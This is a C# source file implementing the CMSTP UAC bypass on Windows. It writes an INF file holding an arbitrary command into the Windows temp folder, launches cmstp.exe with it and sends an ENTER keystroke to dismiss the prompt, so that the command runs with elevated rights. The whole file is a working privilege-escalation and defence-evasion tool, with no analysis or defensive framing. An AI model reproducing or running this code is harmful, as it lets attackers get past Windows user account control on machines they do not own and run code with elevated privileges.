using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;

public class CMSTPBypass
{
    // Our .INF file data!
    public static string InfData = @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

";

    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    /* Generates a random named .inf file with command to be executed with UAC privileges */
    public static string SetInfFile(string CommandToExecute)
    {
        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
        string TemporaryDir = "C:\\windows\\temp";
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append(TemporaryDir);
        OutputFile.Append("\\");
        OutputFile.Append(RandomFileName);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {
        if(!File.Exists(BinaryPath))
        {
            Console.WriteLine("Could not find cmstp.exe binary!");
            return false;
        }
        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));

        Console.WriteLine("Payload file written to " + InfFile.ToString());
        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + InfFile.ToString();
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);

        IntPtr windowHandle = new IntPtr();
        windowHandle = IntPtr.Zero;
        do {
            windowHandle = SetWindowActive("cmstp");
        } while (windowHandle == IntPtr.Zero);

        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
        return true;
    }

    public static IntPtr SetWindowActive(string ProcessName)
    {
        Process[] target = Process.GetProcessesByName(ProcessName);
        if(target.Length == 0) return IntPtr.Zero;
        target[0].Refresh();
        IntPtr WindowHandle = new IntPtr();
        WindowHandle = target[0].MainWindowHandle;
        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
        SetForegroundWindow(WindowHandle);
        ShowWindow(WindowHandle, 5);
        return WindowHandle;
    }
}
